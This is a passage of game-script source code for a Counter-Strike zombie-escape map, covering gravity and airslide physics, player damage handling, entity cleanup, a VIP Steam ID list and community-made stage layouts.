				//DebugDrawBox(tot+Vector(0,tos,0),Vector(-2,-2,-2),Vector(2,2,2),255,0,255,255,0.03);
				//DebugDrawBox(tot+Vector(-tos,0,0),Vector(-2,-2,-2),Vector(2,2,2),255,0,255,255,0.03);
				//DebugDrawBox(tot+Vector(0,-tos,0),Vector(-2,-2,-2),Vector(2,2,2),255,0,255,255,0.03);
				//DebugDrawBox(trigger.GetOrigin(),trigger.GetBoundingMins(),trigger.GetBoundingMaxs(),255,0,100,40,0.03);
			}
			if(!touching_trigger)
			{
				sc.gravdata.lowgrav = 0;
				sc.lowgravtriggers.clear();
			}
		}
		
			//NEW IN v1_9 - ensure removal of lowgrav if infected
		if(::EVENTS.LOWGRAV.active && player.GetTeam()!=3 && sc.gravdata.lowgrav <= 1)
			lgravevent_invalid = true;
		
			//COMMENTED OUT IN v1_6 (causes airslide to 'stick' if touched and then un-touched during lowgrav event)
		//else if(sc.gravdata.lowgrav <= 0 && failsafecheck)	//if the last-touched airslide-trigger doesn't exist/is too far away > failsafe-reset lowgrav!
		{
			if(sc.gravdata.airslide_trig==null||!sc.gravdata.airslide_trig.IsValid())
				sc.gravdata.airslide = 0;
			else if(::GetDistance(player.GetOrigin(),sc.gravdata.airslide_trig.GetOrigin())>::lowgrav_failsafe_airslide_trig_dist)
			{
				sc.gravdata.airslide_trig = null;
				sc.gravdata.airslide = 0;
			}
		}
	}
	
	
	
	if(sc.gravdata.lowgrav < 0)sc.gravdata.lowgrav = 0;
	if(sc.gravdata.airslide < 0)sc.gravdata.airslide = 0;
	local vel = player.GetVelocity();
	
	
	//__CSS__ airslide_workaround_funk - scan nearest airslide and set it, EXPENSIVE though...?
	//if(sc.gravdata.airslide==0)
	//{
	//	local aslide = Entities.FindByNameNearest("airslide_*",player.GetOrigin(),60);
	//	if(aslide!=null)
	//	{
	//		sc.gravdata.airslide = 1;
	//		sc.gravdata.airslide_trig = aslide;
	//	}
	//}
	
	
	if(::AIRSLIDE_SAFETY_ENABLED)
	{
		sc.gravdata.airslide = 0;
		if(sc.gravdata.airslide==0)
		{
			local aslide = Entities.FindByNameNearest("airslide_*",player.GetOrigin(),200);
			if(aslide!=null)
			{
				local aspos = aslide.GetOrigin();
				local ppos = player.GetOrigin();
				local zdif = ppos.z - aspos.z;
				aspos.z = ppos.z;
				//if(zdif < 30.00 && ::GetDistance(aspos,ppos) > 70)				//__CSS__ css3 borked fuckup
				if(::GetDistance(aspos,ppos) > 70 || zdif > ::AIRSLIDE_ZPOS_OFS || zdif < -::AIRSLIDE_ZPOS_OFS_DOWN)	//__CSS__ css4 fix
					aslide = null;
			}
			if(aslide!=null)
			{
				sc.gravdata.airslide = 1;
				sc.gravdata.airslide_trig = aslide;
				local aspos = player.GetOrigin();
				aspos.z = sc.gravdata.airslide_trig.GetOrigin().z + ::AIRSLIDE_ZPOS_OFS;
				local vel = player.GetVelocity();
				if(vel.z < 0.00)					//__CSS__ airslide_workaround_funk - only snap position when going down
				{
					vel.z = 5.00;
					player.SetVelocity(vel);				//__CSS__ airslide_workaround_funk - don't allow negative/falling velocity
					player.SetOrigin(aspos);
				}
			}
		}
	}
	
	
	if(sc.gravdata.airslide>0)
	{
		//EntFireByHandle(player,"AddOutput","gravity 0.01",0.00,null,null);
		//vel.z = 5;
		EntFireByHandle(player,"AddOutput","gravity 0.01",0.00,null,null);
		if(sc.gravdata.airslide_trig==null||!sc.gravdata.airslide_trig.IsValid()){}
		else
		{
			local aspos = player.GetOrigin();
			aspos.z = sc.gravdata.airslide_trig.GetOrigin().z + ::AIRSLIDE_ZPOS_OFS;
			local vel = player.GetVelocity();
			if(vel.z < 0.00)					//__CSS__ airslide_workaround_funk - only snap position when going down
			{
				vel.z = 5.00;
				player.SetVelocity(vel);		//__CSS__ airslide_workaround_funk - don't allow negative/falling velocity
				player.SetOrigin(aspos);
			}
		}
	}
	
	
	else if(lgravevent_invalid)EntFireByHandle(player,"AddOutput","gravity 1.00",0.00,null,null);	//NEW IN v1_9 - ensure removal of lowgrav if infected
	else if(sc.gravdata.lowgrav>0)EntFireByHandle(player,"AddOutput","gravity "+::LOWGRAV_GRAV.tostring(),0.00,null,null);
	else EntFireByHandle(player,"AddOutput","gravity 1.00",0.00,null,null);
	if(failsafecheck)return;//don't cap velocity during normal check...
	local zvel = (0.00+vel.z);
	local xyvel = Vector(vel.x,vel.y,0);
	local xydir = Vector(vel.x,vel.y,0);
	xyvel = xyvel.Length();
	xydir.Norm();
	if(xyvel>::GRAVSLIDE_XYVEL_CAP)xyvel = (0.00+::GRAVSLIDE_XYVEL_CAP);
	if(zvel>::GRAVSLIDE_ZVEL_CAP)zvel = (0.00+::GRAVSLIDE_ZVEL_CAP);
	vel = (xydir*xyvel)+Vector(0,0,zvel);
	player.SetVelocity(vel);
}


//__CSS__ - airslide_safety / airslide_workaround_funk - should be absolutely foolproof against falling through shit now..
::AIRSLIDE_SAFETY_ENABLED <- true;
::AIRSLIDE_SAFETY_RATE <- 0.30;
function TickAirSlideSafety()
{
	EntFire("manager","RunScriptCode","TickAirSlideSafety();",::AIRSLIDE_SAFETY_RATE,null);
	if(!::AIRSLIDE_SAFETY_ENABLED)return;					//not enabled - skip
	if(Entities.FindByName(null,"airslide_*")==null)return;	//no airslide tiles exist - skip
	for(local h;h=Entities.FindByClassname(h,"player");){
		if(!h.IsAlive())continue;
		h.ValidateScriptScope();
		local sc = h.GetScriptScope();
		if(!("gravdata" in sc))continue;	
		if(sc.gravdata.airslide < 0)sc.gravdata.airslide = 0;
		
		
		sc.gravdata.airslide = 0;
		if(sc.gravdata.airslide==0)
		{
			local aslide = Entities.FindByNameNearest("airslide_*",h.GetOrigin(),200);
			if(aslide!=null)
			{
				local aspos = aslide.GetOrigin();
				local ppos = h.GetOrigin();
				local zdif = ppos.z - aspos.z;
				aspos.z = ppos.z;
				//if(zdif < 30.00 && ::GetDistance(aspos,ppos) > 70)				//__CSS__ css3 borked fuckup
				if(::GetDistance(aspos,ppos) > 70 || zdif > ::AIRSLIDE_ZPOS_OFS || zdif < -::AIRSLIDE_ZPOS_OFS_DOWN)	//__CSS__ css4 fix
					aslide = null;
			}
			if(aslide!=null)
			{
				::ValidateGravityFinal(h,sc);
			}
		}
	}
}
EntFire("manager","RunScriptCode","TickAirSlideSafety();",1.50,null);


::SuspendTest <- function()
{
	printl("---------------------------------------------------------------------------------------[SUSPEND TEST]");
	for(local i=0;i<10000;i++)
	{
		for(local j=0;j<10000;j++)
		{
			local a = RandomInt(i,j)/5000*300/100;
			a *= RandomFloat(0.01,100000.00);
			a /= RandomFloat(0.01,100000.00);
			a *= RandomFloat(0.01,100000.00);
			a /= RandomFloat(0.01,100000.00);
			ScriptPrintMessageChatTeam(0,a.tostring());
		}
	}
	printl("---------------------------------------------------------------------------------------[SUSPEND TEST FAILED]");
}

if(!("HURTPLAYER_mult_ct" in this))::HURTPLAYER_mult_ct <- 1.00;		//__CSS__ css5 - damage multiplier towards CT's
if(!("HURTPLAYER_mult_t" in this))::HURTPLAYER_mult_t <- 1.00;			//__CSS__ css5 - damage multiplier towards T's

::HURTPLAYER_INDEX <- 0;
::HURTPLAYER_DELAYS <- [0.00,0.00,0.10];	//hurt@0.00 > 0:rename > 1:cleanup > 2:ensurekill
::HurtPlayer_tickslave <- null;
::HurtPlayer<-function(player,damage,forcepos=null,force=200,attacker=null,svg=null)
{
	if(::HurtPlayer_tickslave==null||!::HurtPlayer_tickslave.IsValid())
	{
		::HurtPlayer_tickslave = Entities.CreateByClassname("logic_relay");
		::HurtPlayer_tickslave.ValidateScriptScope();
		::HurtPlayer_tickslave.GetScriptScope().kill_list <- [];
		::HurtPlayer_tickslave.GetScriptScope().Tick <- function()
		{
			//EntFireByHandle(self,"RunScriptCode","newthread(Tick.bindenv(this)).call();",0.03,null,null);		//__CSS__ threading_disabled
			EntFireByHandle(self,"RunScriptCode","Tick();",0.03,null,null);
			for(local i=0;i<kill_list.len();i++)
			{
				if(kill_list[i]==null||!kill_list[i].IsValid()||kill_list[i].IsAlive()==false||kill_list[i].IsNoclipping())
				{
					kill_list.remove(i);
					i--;
					continue;
				}
				EntFireByHandle(kill_list[i],"SetDamageFilter","",0.00,null,null);
				EntFireByHandle(kill_list[i],"SetHealth","-1",0.00,null,null);
			}
		}
		EntFireByHandle(::HurtPlayer_tickslave,"RunScriptCode","Tick();",0.03,null,null);
	}
	//newthread(::_HurtPlayer.bindenv(::HurtPlayer_tickslave.GetScriptScope())).call(player,damage,forcepos,force,attacker,svg);		//__CSS__ threading_disabled
	::_HurtPlayer(player,damage,forcepos,force,attacker,svg);
}
::_HurtPlayer<-function(player,damage,forcepos=null,force=200,attacker=null,svg=null)
{
	try{
		if(player==null||!player.IsValid()||player.IsAlive()==false)return;
		if(player.GetTeam()==2||player.GetTeam()==3){}else return;
		if((typeof damage)=="bool"&&damage==true)
		{
			//__CSS__ new damage / forcekill:
			player.ValidateScriptScope();
			if("safezombie" in player.GetScriptScope())delete player.GetScriptScope().safezombie;
			player.AcceptInput("SetDamageFilter","",null,null);
			player.AcceptInput("SetHealth","-1",null,null);
			
			
			//EntFireByHandle(player,"SetDamageFilter","",0.00,null,null);
			//EntFireByHandle(player,"SetHealth","-1",0.00,null,null);
			//EntFireByHandle(player,"SetHealth","-1",0.01,null,null);
			//EntFireByHandle(player,"SetDamageFilter","",0.02,null,null);
			//EntFireByHandle(player,"SetHealth","-1",0.03,null,null);
			//EntFireByHandle(player,"SetDamageFilter","",0.04,null,null);
			//EntFireByHandle(player,"SetHealth","-1",0.05,null,null);
			//foreach(p in ::HurtPlayer_tickslave.GetScriptScope().kill_list){if(p==player)return;}
			//::HurtPlayer_tickslave.GetScriptScope().kill_list.push(player);
			return;
		}
		if(player.GetTeam()==2)damage *= ::HURTPLAYER_mult_t;
		else damage *= ::HURTPLAYER_mult_ct;
		local newhp = player.GetHealth()-damage;
		if(newhp>0)
		{
			if(newhp>300)
				player.SetHealth(newhp);
			else if(newhp>0)
				EntFireByHandle(player,"SetHealth",newhp.tostring(),0.00,null,null);
		}
		else
		{
			::HURTPLAYER_INDEX++;
			player.__KeyValueFromString("targetname","hurtplayer_"+::HURTPLAYER_INDEX.tostring());
			player.SetHealth(1);
			if(forcepos==null)forcepos = player.GetOrigin()+Vector(RandomFloat(-100,100),RandomFloat(-100,100),RandomFloat(0,80));
			forcepos += Vector(0,0,-48);
			if(force==null)force = RandomInt(25,300);
			else if(force<5)force=5;
			else if(force>2000)force=2000;
			local kvs = {
					DamageTarget = "hurtplayer_"+::HURTPLAYER_INDEX.tostring(),
					Damage = force.tostring(),
				};
			if(svg!=null)kvs.classname <- svg;
			::Ent(forcepos,Vector(),"point_hurt",kvs,{
				player = player,
				attacker = attacker,
				function Run(){
					::HURTPLAYER_INDEX--;
					EntFireByHandle(this.player,"SetDamageFilter","",0.00,null,null);
					EntFireByHandle(self,"Hurt","",0.00,this.attacker,null);
					EntFireByHandle(this.player,"AddOutput","targetname defaultplayer",::HURTPLAYER_DELAYS[0],null,null);
					EntFireByHandle(this.player,"RunScriptCode","if(self.GetHealth()>0)::HurtPlayer(self,true);",::HURTPLAYER_DELAYS[2],null,null);
					EntFireByHandle(self,"Kill","",::HURTPLAYER_DELAYS[1],null,null);
				}});
		}
	}catch(e){printl("[::HurtPlayer ERROR]: "+e);}
}
::SmoothStep<-function(interp,edge_left=0.10,edge_right=0.90)
{local t=0.00;t=((interp-edge_left)/(edge_right-edge_left));if(t<=0.00)t=0.00;else if(t>=1.00)t=1.00;;return t*t*(3.0-2.0*t);}
::SmootherStep<-function(interp,edge_left=0.10,edge_right=0.90)
{local t=0.00;t=((interp-edge_left)/(edge_right-edge_left));if(t<=0.00)t=0.00;else if(t>=1.00)t=1.00;;return t*t*t*(t*((6.0*t)-15.0)+10.0);}

function UpdateSkyboxPos()
{
	EntFire("manager","RunScriptCode"," UpdateSkyboxPos(); ",5.00,null);
	EntFire("skybox_master","RunScriptCode"," Move(); ",0.00,null);
}
EntFire("manager","RunScriptCode"," UpdateSkyboxPos(); ",5.00,null);

//"caller" is always a logic_relay, named "temcleaner_xxx", Register adds var "mapindex" which matches mapspawnindex, Check checks it/cleans if it matches
//OnUser1 in the temcleaner runs CheckCleanerIndex, which decides if it should die or not based on its mapindex-var, if so it calls "Trigger" to the relay
//OnTrigger in the temcleaner should ensure that all the instanced ents gets killed properly
//but within the specific template you can optionally Kill the temcleaner relay, which would allow the spawned instance to 'live' through the map cleanup
//if an item/trap is moving around, do some logic to ensure that the 'temcleaner_xxx' relay is following it around, if you want it killable (as KillTilesWithin scans for the relay)
function RegisterCleanerIndex()
{
	if(caller==null||!caller.IsValid())return;
	caller.ValidateScriptScope();
	caller.GetScriptScope().mapindex <- (0+mapspawnindex);
}
function CheckCleanerIndex()
{
	if(caller==null||!caller.IsValid())return;
	caller.ValidateScriptScope();
	if(!("mapindex" in caller.GetScriptScope()))return;
	if(mapspawnindex > (caller.GetScriptScope().mapindex))
		EntFireByHandle(caller,"Trigger","",0.00,null,null);
}

//in the Clean() function, kill all the stuff manually, the temcleaner relay gets killed automatically
//if 'handle' is a weapon_ and OnPlayerPickup gets called, it will automatically kill the relay to prevent getting cleaned up
//'cost' will automatically -= the ::EDICTS count when cleanup is called, you only need to clean manually for items on-expend/use (as temcleaner gets killed)
//the temcleaner will otherwise set its own position to the 'handle' origin every 0.20s (and kill itself if 'handle' becomes invalid/killed)
//		EXAMPLE BELOW (put in event #1 of item):
/*----------------------------------------------------------------------------------
::CreateTemCleaner(holder,{
	holder=holder,
	other_handle=null,
	function Clean(){
		EntFireByHandle(holder,"Kill","",0.00,null,null);
		EntFireByHandle(other_handle,"Kill","",0.00,null,null);
	}});
----------------------------------------------------------------------------------*/
::CreateTemCleaner <- function(handle,logic)	//logic:{function Clean(){}}
{
	::Ent(Vector(),Vector(),"logic_relay",{targetname="temcleaner_vscript"},{
		handle = handle,
		logic = logic,
		cleaned = false,
		mapindex = -1,
		function RunClean()
		{
			//if(::manager.GetScriptScope().mapspawnindex <= mapindex)return;														//OLD - didn't take 'MAX_AREA_HISTORY' into account
			if(!::finale_endrun_started)
				{if(::manager.GetScriptScope().mapspawnindex <= (mapindex+(::manager.GetScriptScope().MAX_AREA_HISTORY-1)))return;}	//NEW - items despawn properly with despawned stages now
			else
				{if(::manager.GetScriptScope().mapspawnindex <= (mapindex+(::manager.GetScriptScope().MAX_AREA_HISTORY)))return;}	//NEW - finale-exclusive jank fix
			if(cleaned)return;
			cleaned = true;
			EntFireByHandle(self,"Kill","",0.00,null,null);
			logic.Clean();
		},function Run(){
			mapindex = 1+::manager.GetScriptScope().mapspawnindex;
			EntFireByHandle(self,"AddOutput","OnTrigger !self:RunScriptCode:RunClean();:0:-1",0.00,null,null);
			EntFireByHandle(self,"AddOutput","OnUser1 !self:Trigger::0:-1",0.00,null,null);
			EntFireByHandle(::manager,"RunScriptCode"," RegisterCleanerIndex(); ",0.05,null,self);
			handle.ValidateScriptScope();
			handle.GetScriptScope().TemCleanPickup<-{
					temcleaner = self,
					cleanup = false,
					hand = handle,
					function TickTemCleanerPos()
					{
						if(cleanup || hand==null || !hand.IsValid())
						{
							EntFireByHandle(temcleaner,"Kill","",0.00,null,null);
							return;
						}
						EntFireByHandle(hand,"RunScriptCode"," TemCleanPickup.TickTemCleanerPos(); ",0.10,null,null);
						temcleaner.SetOrigin(hand.GetOrigin());
					},
					function RemoveTemCleaner(){cleanup=true;}
				};
			EntFireByHandle(handle,"RunScriptCode"," TemCleanPickup.TickTemCleanerPos(); ",0.10,null,null);
			EntFireByHandle(handle,"AddOutput","OnPlayerPickup !self:RunScriptCode:TemCleanPickup.RemoveTemCleaner();:0:1",0.00,null,null);
		}});
}
::CreateCostCleaner <- function(button,cost)
{
	::Ent(Vector(),Vector(),"logic_relay",{targetname="costcleaner_vscript"},{
		button = button,
		cost = cost,
		cleaned = false,
		killself = false,
		function Tick(){
			if(killself)
			{
				EntFireByHandle(self,"Kill","",0.00,null,null);
				return;
			}
			EntFireByHandle(self,"RunScriptCode"," Tick(); ",1.00,null,null);
			if(button==null||!button.IsValid())
			{
				killself = true;
				::EDICTS -= cost;
			}
		},function Run(){
			::EDICTS += cost;
			EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.10,null,null);
		}});
}
::AddWebMaps <- function(webmaps)
{
	foreach(wm in webmaps)
	{
		wm.maps <- ::maps;
		wm.Run();
	}
}
//------------------------------------------------------------------------------------------------------------------------------------------------\\
	//UPDATE list of disallowed in the finale-endrun each new version (too problematic):
if(!("FINALE_ENDRUN_IGNORED_STAGES" in this))::FINALE_ENDRUN_IGNORED_STAGES <- [
		//"#xxxxxxxxxx",	//xxxxx_MAPNAME_xxxxx	-	xxxxx_AUTHOR_xxxxx
		//"#1650691332",	//Head Bumper			- 	DankArab
		//"#1650889019",	//dontcrouch			-	chong
		"#1673322993",		//end Of The Line		-	ZpLit
	];
//------------------------------------------------------------------------------------------------------------------------------------------------\\
	//UPDATE list of VIPS each new version:
if(!("VIPS_SET" in this))
{::VIPS_SET <- true;


::VIPS <- ["STEAM_1:1:22521282", //Luffaren
		"STEAM_1:1:26637870",	 //Ficool - helped out with various technical difficulties
		"STEAM_1:0:35711305",	 //Xen - helped out with various technical difficulties
        
		//patrons
        "STEAM_1:1:44083262",
        "STEAM_1:0:48139771",
        "STEAM_1:0:87605592",
        "STEAM_1:0:36561009",
        "STEAM_1:1:53399461",
        "STEAM_1:1:90927558",
        "STEAM_1:1:146402862",
        "STEAM_1:1:153776903",
        "STEAM_1:0:23006811",
        "STEAM_1:0:5680239",
        "STEAM_1:1:43037051",
        "STEAM_1:0:60172513",
        "STEAM_1:1:57774125",
        "STEAM_1:1:44846771",
        "STEAM_1:0:545026218",
        "STEAM_1:1:161646505",
        "STEAM_1:1:36935027",
        "STEAM_1:1:2359822",
        "STEAM_1:1:19059031",
        "STEAM_1:0:1726051",
        "STEAM_1:0:145949752",
        "STEAM_1:1:76518687",
        "STEAM_1:1:20450857",
        "STEAM_1:1:429610828",
];
	

}
//------------------------------------------------------------------------------------------------------------------------------------------------\\
if(!("maps_first_set" in this)){::maps_first_set<-true;printl("MAP START - ADDING INCLUDED/DEFAULT MAPS");//--------------------------------------\\
::_SetMapsFirst<-function(){::cached_maps<-{};//--------------------------------------------------------------------------------------------------\\

	//UPDATE list of maps each new version:




maps.push({name="Sky",author="Wordexe",id="#1650651676",direction="forward",cost=44,elevation=13,map=[0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,5,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,0,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,8,8,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,0,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,13,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,13,13,13,93,13,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Teamwork Dreamwork",author="chinny",id="#1650651689",direction="forward",cost=246,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,1,22,1,15,19,14,14,17,19,1,24,1,0,0,0,0,0,0,0,0,20,14,14,14,14,14,14,14,14,14,14,16,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,14,14,24,0,0,0,0,0,0,0,0,19,14,14,1,16,18,18,16,1,14,14,1,0,0,0,0,1,21,22,1,1,14,14,1,0,24,24,0,17,14,14,1,21,22,1,21,0,14,14,14,14,14,14,17,0,24,24,0,1,14,14,14,14,14,14,0,0,14,14,14,14,14,14,1,18,18,18,18,23,14,14,14,14,14,14,0,0,14,14,20,22,0,24,1,18,93,94,18,1,24,0,19,0,14,14,0,0,14,14,17,0,0,0,24,18,18,18,18,22,0,0,0,0,14,14,0,18,14,14,0,0,0,0,1,24,24,24,24,1,0,0,0,0,14,14,1,1,14,14,0,0,0,0,1,0,0,0,0,1,0,0,0,17,14,14,22,23,14,14,0,18,23,0,19,0,0,0,0,1,19,0,20,18,14,14,1,1,14,14,86,96,14,14,1,0,0,0,0,22,14,14,98,86,14,14,24,24,14,14,86,96,14,14,21,0,0,0,0,1,14,14,98,86,14,14,22,18,0,1,20,1,14,14,14,14,14,14,14,14,14,14,1,22,1,0,17,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,34,0,0,0,0,22,20,0,14,14,0,20,24,0,0,0,0,34,0,0,99,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,97,0]});
maps.push({name="ZEPIXELPENISv2",author="Jblah",id="#1650651746",direction="forward",cost=233,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,90,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,90,5,90,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,90,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,90,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,90,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,5,5,7,5,5,5,5,5,5,5,90,5,90,0,0,0,0,0,5,5,5,5,7,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,97,87,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,3,5,5,5,7,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,24,0,5,5,7,5,5,5,5,5,5,5,5,5,96,96,96,0,0,0,24,0,0,0,0,0,0,0,0,96,96,96,96,96,96,5,5,5,0,0,24,24,0,0,0,0,0,0,0,0,5,90,5,5,5,5,90,5,0,0,24,24,24,0,0,0,0,0,0,0,5,5,5,5,90,5,5,5,0,0,24,24,24,24,24,0,0,0,0,0,5,90,5,5,5,5,90,5,0,0,0,24,24,24,24,0,0,0,0,0,5,5,5,90,5,90,5,5,0,0,0,0,24,24,24,24,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,24,93,0,0,0,0,0,0,0,2,2,0,0,0,0,0]});
maps.push({name="SUS",author="Suspect",id="#1650654523",direction="forward",cost=682,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,76,76,76,76,76,76,76,5,5,0,0,0,0,0,0,0,0,0,5,76,76,76,76,76,76,76,76,76,5,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,5,5,5,76,76,76,76,76,76,76,76,76,76,76,76,76,5,5,0,5,5,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,5,5,5,5,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,5,5,96,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,5,97,96,76,76,76,76,76,5,100,5,76,76,76,76,76,76,5,5,5,5,0,5,76,76,76,5,5,5,5,5,5,76,76,76,76,76,5,5,0,0,0,5,76,76,76,5,5,74,74,74,5,5,76,76,76,76,76,98,98,0,0,5,76,76,76,5,71,71,74,74,74,5,76,76,76,76,76,76,5,5,0,5,5,76,76,5,65,71,71,74,74,5,76,76,76,76,76,76,76,5,5,0,5,76,76,5,65,65,71,74,74,5,76,76,76,76,76,76,76,5,5,0,99,101,76,5,65,65,71,74,74,5,76,76,76,76,76,76,76,5,5,0,0,101,5,5,65,65,71,74,5,76,76,76,76,76,76,76,76,5,5,0,0,0,5,5,5,65,71,74,5,76,76,76,76,76,76,5,5,5,0,0,0,0,0,0,5,5,5,5,5,101,101,102,5,5,5,5,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Item Room",author="issic",id="#1650655624",direction="forward",cost=170,elevation=4,map=[0,0,0,0,0,0,0,0,0,2,2,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,32,32,94,0,0,0,0,0,0,0,0,0,0,0,0,93,0,0,54,54,24,32,32,0,0,0,0,0,0,0,0,0,0,0,0,14,0,20,54,54,24,3,32,1,1,0,0,0,0,0,0,0,0,0,0,14,0,20,54,54,24,32,32,95,32,0,0,0,0,0,0,0,0,14,89,14,0,20,54,54,32,32,94,1,32,0,0,0,0,0,0,0,0,14,0,0,0,1,54,54,1,1,1,1,92,0,0,0,0,0,0,0,0,14,0,0,1,1,54,54,0,0,0,1,0,0,0,0,0,0,97,14,14,14,0,0,92,34,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,1,1,35,35,0,0,0,0,0,32,0,0,0,0,0,0,0,18,0,0,0,1,36,36,0,0,0,1,0,30,94,0,0,0,0,0,96,18,96,0,0,0,37,37,0,0,0,0,0,28,0,0,0,0,0,0,0,96,0,0,0,96,38,38,96,0,0,0,0,0,0,0,0,0,0,0,0,18,0,0,0,0,96,96,0,0,0,1,32,0,0,0,0,0,0,0,0,19,0,0,0,0,38,38,92,32,32,32,32,0,0,0,0,0,0,20,89,20,21,22,91,91,38,38,0,0,0,0,0,0,0,0,0,0,93,20,89,20,0,0,0,98,38,38,98,0,0,0,0,0,0,0,0,0,0,20,20,20,0,0,0,0,98,98,0,0,0,0,0,0,0,0,0,0,0,0,99,0,0,0,0,0,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="zeOuO",author="DailyFirefuck",id="#1650656199",direction="forward",cost=150,elevation=0,map=[0,0,0,5,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,5,76,76,76,76,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,76,76,76,76,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,76,76,76,76,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,76,76,76,76,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,93,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,76,76,76,76,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,76,76,76,76,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,76,76,76,76,5,0,0,0,0,0,0,0,0,0,0,0,0,5,0,5,76,76,76,76,5,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
